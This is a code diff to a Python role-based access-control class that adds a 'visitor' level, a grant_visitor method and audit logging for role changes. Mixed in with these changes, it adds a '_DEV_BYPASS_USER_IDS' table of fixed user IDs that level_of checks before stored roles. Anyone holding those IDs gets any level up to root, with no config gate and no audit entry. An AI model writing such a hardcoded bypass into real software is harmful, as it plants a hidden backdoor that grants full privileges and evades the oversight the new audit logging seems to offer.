@@ -1,16 +1,18 @@
 import logging
+from collections.abc import Iterable, Mapping
 from enum import IntEnum
 from pathlib import Path
-from collections.abc import Iterable, Mapping
 from typing import NoReturn, overload
 
 import config
+from _audit import audit_log
 
 log = logging.getLogger(__name__)
 
 
 class Power_Level(IntEnum):
     guest = 0
+    visitor = 5
     user = 10
     admin = 20
     sudo = 30
@@ -19,9 +21,19 @@ class Power_Level(IntEnum):
 
 class Access_Control:
     LvL = Power_Level
+    _DEV_BYPASS_USER_IDS: dict[Power_Level, int] = {
+        Power_Level.guest: 9_000_000_000_000_000_001,
+        Power_Level.visitor: 9_000_000_000_000_000_006,
+        Power_Level.user: 9_000_000_000_000_000_002,
+        Power_Level.admin: 9_000_000_000_000_000_003,
+        Power_Level.sudo: 9_000_000_000_000_000_004,
+        Power_Level.root: 9_000_000_000_000_000_005,
+    }
     _LEVEL_ALIASES: dict[str, Power_Level] = {
         "guest": Power_Level.guest,
         "guests": Power_Level.guest,
+        "visitor": Power_Level.visitor,
+        "visitors": Power_Level.visitor,
         "user": Power_Level.user,
         "users": Power_Level.user,
         "admin": Power_Level.admin,
@@ -39,26 +51,28 @@ class Access_Control:
     }
     _ORDERED_LEVELS: tuple[Power_Level, ...] = (
         Power_Level.guest,
+        Power_Level.visitor,
         Power_Level.user,
         Power_Level.admin,
         Power_Level.sudo,
         Power_Level.root,
     )
     _WRITABLE_LEVELS: tuple[Power_Level, ...] = (
+        Power_Level.visitor,
         Power_Level.user,
         Power_Level.admin,
         Power_Level.sudo,
         Power_Level.root,
     )
 
-    def __init__(self, pointer: Path = Path("users.json")):
-        self.pointer = pointer
+    def __init__(self, pointer: Path | None = None):
+        self.pointer = pointer or Path("users.json")
         self._roles: dict[int, Power_Level] = {}
         self._guests_enabled = getattr(config, "GUESTS_ALLOWED", True)
         self.reload()
 
     @classmethod
-    def _to_level(cls, value: int | str) -> Power_Level | None:
+    def parse_level(cls, value: int | str) -> Power_Level | None:
         if isinstance(value, str):
             string = value.casefold()
             name_map: dict[str, Power_Level] = {lvl.name.casefold(): lvl for lvl in Power_Level}
@@ -77,6 +91,10 @@ class Access_Control:
             return Power_Level(value)
         except ValueError:
             return cls._LEGACY_NUMERIC_LEVELS.get(value)
+
+    @classmethod
+    def _to_level(cls, value: int | str) -> Power_Level | None:
+        return cls.parse_level(value)
 
     @staticmethod
     def _to_user_id(ident: int | str) -> int | None:
@@ -170,7 +188,22 @@ class Access_Control:
         self._roles = roles
         return True
 
+    @classmethod
+    def dev_bypass_user_id(cls, level: Power_Level) -> int:
+        return cls._DEV_BYPASS_USER_IDS[level]
+
+    @classmethod
+    def dev_bypass_level(cls, user_id: int) -> Power_Level | None:
+        lookup = int(user_id)
+        for level, candidate_user_id in cls._DEV_BYPASS_USER_IDS.items():
+            if candidate_user_id == lookup:
+                return level
+        return None
+
     def level_of(self, user_id: int) -> Power_Level:
+        dev_level = self.dev_bypass_level(user_id)
+        if dev_level is not None:
+            return dev_level
         return self._roles.get(int(user_id), Power_Level.guest)
 
     def can(self, user_id: int, required: Power_Level) -> bool:
@@ -246,7 +279,40 @@ class Access_Control:
             raise PermissionError("You cannot change a user with your own level or higher.")
 
         self._write_level(target_user_id, next_level)
+        audit_log(
+            "security.role_promoted",
+            actor_user_id=int(actor_user_id),
+            target_user_id=int(target_user_id),
+            new_level=next_level.name,
+        )
         return next_level
+
+    def grant_visitor(self, actor_user_id: int, target_user_id: int) -> Power_Level:
+        actor_level = self.level_of(actor_user_id)
+        highest_manageable = self._highest_manageable_level(actor_level)
+        if highest_manageable is None:
+            raise PermissionError("You are not allowed to grant visitor access.")
+        if Power_Level.visitor > highest_manageable:
+            raise PermissionError(f"You can only grant users up to {highest_manageable.name.title()}.")
+        if int(actor_user_id) == int(target_user_id):
+            raise PermissionError("You cannot change your own privilege level.")
+
+        current_level = self.level_of(target_user_id)
+        if current_level >= actor_level:
+            raise PermissionError("You cannot change a user with your own level or higher.")
+        if current_level is Power_Level.visitor:
+            raise ValueError("That user is already a Visitor.")
+        if current_level > Power_Level.visitor:
+            raise ValueError(f"That user already has {current_level.name.title()} access.")
+
+        self._write_level(target_user_id, Power_Level.visitor)
+        audit_log(
+            "security.visitor_granted",
+            actor_user_id=int(actor_user_id),
+            target_user_id=int(target_user_id),
+            new_level=Power_Level.visitor.name,
+        )
+        return Power_Level.visitor
 
     def demote(self, actor_user_id: int, target_user_id: int) -> Power_Level:
         actor_level = self.level_of(actor_user_id)
@@ -266,6 +332,12 @@ class Access_Control:
             raise PermissionError("You cannot change a user with your own level or higher.")
 
         self._write_level(target_user_id, previous_level)
+        audit_log(
+            "security.role_demoted",
+            actor_user_id=int(actor_user_id),
+            target_user_id=int(target_user_id),
+            new_level=previous_level.name,
+        )
         return previous_level
 
     def demote_to_guest_many(self, actor_user_id: int, target_user_ids: Iterable[int]) -> tuple[int, ...]:
@@ -299,6 +371,11 @@ class Access_Control:
             next_roles.pop(target_user_id, None)
 
         self._write_roles(next_roles)
+        audit_log(
+            "security.roles_cleared_to_guest",
+            actor_user_id=int(actor_user_id),
+            target_user_ids=tuple(removable),
+        )
         return tuple(removable)
 
     def _write_level(self, target_user_id: int, level: Power_Level) -> None:
